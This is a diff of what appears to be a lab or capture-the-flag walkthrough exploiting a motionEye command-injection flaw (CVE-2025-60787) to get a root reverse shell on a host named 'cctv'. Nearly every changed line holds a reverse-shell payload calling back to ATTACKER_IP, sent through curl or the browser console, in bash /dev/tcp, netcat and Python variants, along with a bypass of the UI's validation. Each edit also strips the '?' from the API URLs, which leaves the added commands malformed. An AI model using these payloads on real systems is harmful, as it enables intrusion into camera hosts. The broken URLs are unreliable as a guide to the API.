@@ -329,7 +329,7 @@ configUiValid = function() { return true; };
 # Enable picture output via API
 # What it does: enable picture capture in the motionEye configuration via the API.
 # Why here: prepare the system to trigger the command injection payload when a motion event is detected.
-curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
+curl "http://127.0.0.1:7999/1/config/setpicture_output=on"
 ```
 
 ### Step 4 — Inject Reverse Shell Payload
@@ -347,7 +347,7 @@ nc -lvnp 4444
 ```bash
 # What it does: inject a bash reverse shell payload into the picture_filename parameter.
 # Why here: exploit CVE-2025-60787 to gain code execution when the motion daemon attempts to save a picture.
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
 ```
 
 **Payload Breakdown:**
@@ -359,7 +359,7 @@ curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >&
 ```bash
 # What it does: send a URL-encoded reverse shell payload to the motionEye API.
 # Why here: ensure the payload is correctly parsed by the web server to trigger the command injection.
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
 ```
 
 ### Step 5 — Trigger Motion Detection
@@ -370,7 +370,7 @@ The payload executes when motion detection triggers a picture capture:
 # Enable motion emulation to trigger the capture
 # What it does: force a motion detection event via the API.
 # Why here: trigger the immediate execution of the injected command in picture_filename to receive the reverse shell.
-curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
+curl "http://127.0.0.1:7999/1/config/setemulate_motion=on"
 ```
 
 ### Step 6 — Reverse Shell Received
@@ -384,7 +384,7 @@ root@cctv:~#
 
 **✅ Privilege escalation achieved — reverse shell as `root`.**
 
-**Why Root?** The `motion` daemon runs as `root` on this system (misconfiguration). When the configuration file is parsed and the injected command is executed, it inherits the daemon's root privileges.
+**Why Root** The `motion` daemon runs as `root` on this system (misconfiguration). When the configuration file is parsed and the injected command is executed, it inherits the daemon's root privileges.
 
 ---
 
@@ -408,7 +408,7 @@ Instead of using curl, inject the payload directly through the browser console:
 // Open browser console on motionEye UI (http://127.0.0.1:8765)
 // Navigate to Camera Settings → Still Images → Picture Filename
 // Inject payload:
-fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\')')
+fetch('/1/config/setpicture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\')')
 ```
 
 ### Method 2 — Config File Direct Edit
@@ -507,13 +507,13 @@ ssh -L 8765:127.0.0.1:7999 USER@TARGET
 # Enable picture output
 # What it does: enable picture capture via the motionEye API.
 # Why here: fulfill the prerequisite for the command injection vulnerability in picture_filename.
-curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
+curl "http://127.0.0.1:7999/1/config/setpicture_output=on"
 
 # Inject reverse shell (picture_filename parameter)
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')"
 
 # Trigger motion detection
-curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
+curl "http://127.0.0.1:7999/1/config/setemulate_motion=on"
 ```
 
 ### Alternative Payloads
@@ -522,14 +522,14 @@ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 ```bash
 # What it does: inject a netcat-based reverse shell payload.
 # Why here: provide an alternative RCE payload for environments where bash -i is restricted or not available.
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(nc -e /bin/bash ATTACKER_IP PORT)"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(nc -e /bin/bash ATTACKER_IP PORT)"
 ```
 
 **Python reverse shell:**
 ```bash
 # What it does: inject a Python-based reverse shell payload.
 # Why here: provide a reliable reverse shell option for systems with Python 3 installed and restricted shell environments.
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])')"
+curl "http://127.0.0.1:7999/1/config/setpicture_filename=\$(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])')"
 ```
 
 ### Browser Console Method
@@ -540,7 +540,7 @@ curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(python3 -c 'import 
 configUiValid = function() { return true; };
 
 // Inject payload via fetch API
-fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\')')
+fetch('/1/config/setpicture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\')')
 ```
 
 ---
@@ -602,7 +602,7 @@ sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
 curl "http://127.0.0.1:7999/1/config/get"
 
 # Set configuration value
-curl "http://127.0.0.1:7999/1/config/set?<parameter>=<value>"
+curl "http://127.0.0.1:7999/1/config/set<parameter>=<value>"
 
 # List cameras
 curl "http://127.0.0.1:7999/list"
